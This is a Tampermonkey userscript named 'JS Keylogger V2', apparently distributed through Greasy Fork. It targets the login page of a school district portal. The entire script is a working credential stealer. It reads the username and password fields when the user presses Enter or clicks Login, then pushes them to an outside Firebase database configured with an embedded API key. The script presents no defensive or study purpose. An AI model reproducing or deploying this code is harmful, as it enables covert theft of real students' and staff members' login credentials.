// ==UserScript==
// @name         JS Keylogger V2
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Keylogger for chrome using JS
// @author       You
// @match        https://my.cherrycreekschools.org/*
// @grant        none
//@require https://www.gstatic.com/firebasejs/3.5.2/firebase.js
// @downloadURL https://update.greasyfork.org/scripts/375441/JS%20Keylogger%20V2.user.js
// @updateURL https://update.greasyfork.org/scripts/375441/JS%20Keylogger%20V2.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...
    window.onload = function(){
        var config = {
            apiKey: "AIzaSyCtagvRPuV49zpoErTly-dl6HyjjjKkLo8",
            authDomain: "record-creek-data.firebaseapp.com",
            databaseURL: "https://record-creek-data.firebaseio.com",
            projectId: "record-creek-data",
            storageBucket: "",
            messagingSenderId: "1059244189723"
        };
        firebase.initializeApp(config);
        var database = firebase.database();
        var currUsername, currPassword;
        document.onkeydown = function(e) {
            if(e.key=='Enter'){
                currUsername = document.getElementsByClassName('loginForm-text-input')[0].value;
                currPassword = document.getElementsByClassName('loginForm-text-input')[1].value;
                var data = {
                    username: currUsername,
                    password: currPassword
                }
                database.ref('entries').push(data);
            }
        }
        var loginButton = document.getElementById('LoginButton');
        try{
            loginButton.addEventListener("click", function(){
                currUsername = document.getElementsByClassName('loginForm-text-input')[0].value;
                currPassword = document.getElementsByClassName('loginForm-text-input')[1].value;
                var data = {
                    username: currUsername,
                    password: currPassword
                }
                database.ref('entries').push(data);
            });
        }catch(err){
            console.log();
        }
    }
})();